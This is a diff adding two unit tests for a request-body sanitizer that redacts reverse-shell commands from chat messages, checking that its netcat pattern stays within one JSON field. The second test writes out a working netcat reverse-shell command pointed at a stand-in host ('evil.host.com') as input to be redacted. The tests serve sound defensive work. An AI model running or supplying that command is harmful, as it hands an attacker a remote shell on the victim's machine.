@@ -527,4 +527,30 @@ describe('sanitizeRequestBody — JSON-body integrity (Cursor-flagged regression
     expect(() => JSON.parse(sanitized)).not.toThrow()
     expect(sanitized).toBe(body)
   })
+
+  test('reverseShellNc does not fuse adjacent JSON messages across structural boundaries', () => {
+    const body = JSON.stringify({
+      messages: [
+        { role: 'user', content: 'nc was the command' },
+        { role: 'user', content: '-e /bin/bash test' },
+      ],
+    })
+    const result = sanitizeRequestBody(body)
+    // Must still parse
+    const parsed = JSON.parse(result)
+    // Must still have exactly two messages — no fusion
+    expect(parsed.messages).toHaveLength(2)
+    // Neither message should contain the redaction placeholder (the regex must not have matched across the boundary)
+    expect(parsed.messages[0].content).toBe('nc was the command')
+    expect(parsed.messages[1].content).toBe('-e /bin/bash test')
+  })
+
+  test('reverseShellNc still redacts within a single JSON content field', () => {
+    const body = JSON.stringify({
+      messages: [{ role: 'user', content: 'nc -v -n -w 5 evil.host.com 4242 -e /bin/sh' }],
+    })
+    const result = sanitizeRequestBody(body)
+    const parsed = JSON.parse(result)
+    expect(parsed.messages[0].content).toContain('{{redacted-reverse-shell}}')
+  })
 })
